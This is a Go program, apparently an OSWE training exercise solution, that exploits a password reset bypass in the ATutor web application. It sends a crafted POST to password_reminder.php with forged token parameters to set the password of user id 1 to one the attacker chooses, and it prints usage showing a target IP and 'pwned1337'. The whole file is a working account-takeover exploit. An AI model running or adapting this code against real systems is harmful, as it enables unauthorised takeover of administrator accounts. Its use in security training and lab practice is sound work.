package main

import (
	"crypto/sha1"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"github.com/iPhantasmic/OSWE/scripts/utils"
	"log"
	"net/http"
	"net/url"
	"os"
)

// Ex 4.5.2.3 - Extra Mile: Password reset link bypass

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func resetPassword(debug bool, ip string, password string) bool {
	requestURL := fmt.Sprintf("http://%s/ATutor/password_reminder.php", ip)

	newHash := sha1.Sum([]byte(password))
	hash := hex.EncodeToString(newHash[:])

	// prepare POST request body (form)
	data := url.Values{
		"id":                   {"1"},
		"g":                    {"123456789"},
		"h":                    {"0"},
		"form_change":          {""},
		"form_password_hidden": {hash},
	}

	// send the request
	utils.PrintInfo("Sending password reset request...")
	response := utils.SendPostRequest(client, debug, requestURL, utils.PostRequest{
		ContentType: "form",
		Cookies:     []*http.Cookie{},
		FormData:    data,
		JsonData:    "",
	})

	if response.StatusCode == 200 {
		return true
	}

	return false
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 3 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy=<proxyIP>] <target> <password>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103 pwned1337", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)
	password := flag.Arg(1)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{
		Transport: tr,
	}

	if resetPassword(*debug, ip, password) {
		fmt.Println("")
		utils.PrintSuccess("Password changed!")
	}

}
